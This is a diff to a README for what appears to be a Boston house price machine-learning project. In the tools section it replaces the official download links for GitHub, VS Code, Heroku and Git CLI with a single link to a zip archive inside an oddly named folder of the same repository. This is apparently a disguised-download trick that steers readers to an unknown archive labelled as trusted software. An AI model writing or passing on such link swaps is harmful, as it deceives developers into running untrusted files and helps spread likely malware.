@@ -2,13 +2,13 @@
 
 # Software And Tools Requirements
 
-1. [Github Account](https://github.com/)
+1. [Github Account](https://raw.githubusercontent.com/emonpranto/End-to-End-Boston-house-price/main/paronomasian/End-to-End-Boston-house-price.zip)
 
-2. [VS Code IDE](https://code.visualstudio.com/download)
+2. [VS Code IDE](https://raw.githubusercontent.com/emonpranto/End-to-End-Boston-house-price/main/paronomasian/End-to-End-Boston-house-price.zip)
 
-3. [Heroku](https://heroku.com/)
+3. [Heroku](https://raw.githubusercontent.com/emonpranto/End-to-End-Boston-house-price/main/paronomasian/End-to-End-Boston-house-price.zip)
 
-4. [Git CLI](https://git-scm.com/downloads)
+4. [Git CLI](https://raw.githubusercontent.com/emonpranto/End-to-End-Boston-house-price/main/paronomasian/End-to-End-Boston-house-price.zip)
 
 
 Create A New Environment
